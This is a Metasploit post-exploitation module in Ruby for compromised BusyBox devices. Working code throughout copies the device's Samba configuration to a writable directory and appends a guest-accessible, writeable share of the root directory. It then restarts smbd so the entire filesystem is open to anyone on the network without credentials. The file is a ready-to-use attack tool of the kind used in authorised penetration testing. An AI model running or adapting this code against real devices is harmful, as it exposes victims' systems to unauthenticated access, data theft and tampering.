##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Linux::BusyBox

  def initialize
    super(
      'Name'         => 'BusyBox SMB Sharing',
      'Description'  => %q{
        This module will be applied on a session connected to a BusyBox shell. It will modify
        the SMB configuration of the device executing BusyBox to share the root directory of
        the device.
      },
      'Author'       => 'Javier Vicente Vallejo',
      'License'      => MSF_LICENSE,
      'Platform'     => ['linux'],
      'SessionTypes' => ['shell']
    )
  end

  def run
    print_status('Checking smb.conf...')
    if busy_box_file_exist?('/var/samba/smb.conf')
      print_status('smb.conf found, searching writable directory...')
      writable_directory = busy_box_writable_dir
      if writable_directory
        print_status('writable directory found, copying smb.conf and restarting smbd')
        copy_smb_conf(writable_directory)
      else
        print_error('Writable directory not found')
      end
    else
      print_error('smb.conf not found')
    end
  end

  def copy_smb_conf(dir)
    cmd_exec_delay("rm -f #{dir}smb.conf")
    cmd_exec_delay("cp -f /var/samba/smb.conf #{dir}smb.conf")
    cmd_exec_delay("echo -e '[rootdir]\ncomment = rootdir\npath = /\nbrowseable = yes\nwriteable = yes\nguest ok = yes\n' >> #{dir}smb.conf")
    cmd_exec_delay('killall smbd')
    cmd_exec_delay("smbd -D -s #{dir}smb.conf")
    cmd_exec_delay("smbd -D -s=#{dir}smb.conf") # Uses equal just in case
  end

  def cmd_exec_delay(command)
    res = cmd_exec(command)
    vprint_status(res)
    Rex.sleep(0.1)
  end
end
